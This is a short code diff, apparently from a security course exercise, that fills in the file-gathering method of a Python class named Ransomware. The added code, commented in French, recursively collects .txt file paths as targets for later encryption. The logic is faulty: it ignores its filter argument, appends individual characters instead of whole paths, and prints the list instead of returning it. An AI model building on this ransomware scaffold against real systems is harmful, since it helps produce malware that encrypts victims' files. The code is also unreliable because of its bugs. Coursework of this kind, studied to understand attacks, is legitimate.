@@ -36,7 +36,17 @@ class Ransomware:
 
     def get_files(self, filter:str)->list:
         # return all files matching the filter
-        raise NotImplemented()
+        # Chemin du répertoire courant
+        current_dir = Path.cwd()
+
+        # Recherche récursive de tous les fichiers *.txt
+        txt_files = current_dir.rglob('*.txt')
+        txt_file_paths = []
+        # Liste des chemins absolus des fichiers *.txt trouvés, sous forme de chaînes de caractères
+        for file_path in txt_files :
+            txt_file_paths += str(file_path.absolute())
+        # Affichage de la liste des chemins absolus des fichiers *.txt trouvés
+        print(txt_file_paths)
 
     def encrypt(self):
         # main function for encrypting (see PDF)
